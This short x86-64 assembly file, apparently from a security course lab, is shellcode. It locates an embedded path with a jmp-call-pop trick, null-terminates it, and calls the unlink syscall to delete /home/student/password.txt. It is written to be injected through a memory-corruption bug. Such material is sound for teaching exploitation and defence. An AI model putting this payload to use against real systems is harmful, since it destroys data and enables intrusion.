#include <sys/syscall.h>

#define TARGET "/home/student/password.txt"
#define STRLEN 26

.globl main
	.type	main, @function

 main:
	jmp	calladdr

 popladdr:
	popq	%rdi			/* %rdi -> path string */
	xorq	%rax,%rax		/* zero register for terminator */
	movb	%al,(STRLEN)(%rdi)	/* null-terminate string in-place */

	movb	$SYS_unlink,%al		/* unlink("/home/student/password.txt") */
	syscall

	xorq	%rax,%rax		/* clean exit(0) */
	movb    $SYS_exit,%al
	xorq	%rdi,%rdi
	syscall				/* invoke syscall */

 calladdr:
	call	popladdr
	.ascii	TARGET
